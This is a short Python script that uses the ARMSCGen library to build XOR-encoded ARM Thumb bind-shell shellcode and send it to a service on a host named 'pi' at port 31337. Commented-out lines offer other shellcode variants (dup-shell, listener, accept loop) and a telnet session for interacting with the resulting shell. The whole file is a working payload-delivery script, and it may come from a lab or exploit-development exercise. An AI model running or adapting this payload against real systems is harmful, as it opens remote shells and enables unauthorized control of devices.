#!python

from ARMSCGen import *
from socket import *
import telnetlib
import time

HOST = 'pi'
PORT = 31337

def getShellcode():
    #xsc = CompileSC(ARM_THUMB_DUPSH(sock=4), isThumb=True)
    #xsc = CompileSC(ARM_THUMB_LISTEN(55555), isThumb=True)
    #xsc = CompileSC(ARM_THUMB_ACCEPTLOOP(55556), isThumb=True)
    xsc = CompileSC(ARM_THUMB_BINDSHELL(55559, sock=5, once=False), isThumb=True)
    return MakeXorShellcode(xsc)

sc = getShellcode()


s = socket(AF_INET, SOCK_STREAM)
s.connect( (HOST, PORT) )
f = s.makefile('rw', bufsize=0)
f.write(sc + '\n')
#tn = telnetlib.Telnet()
#tn.sock = s
#tn.interact()
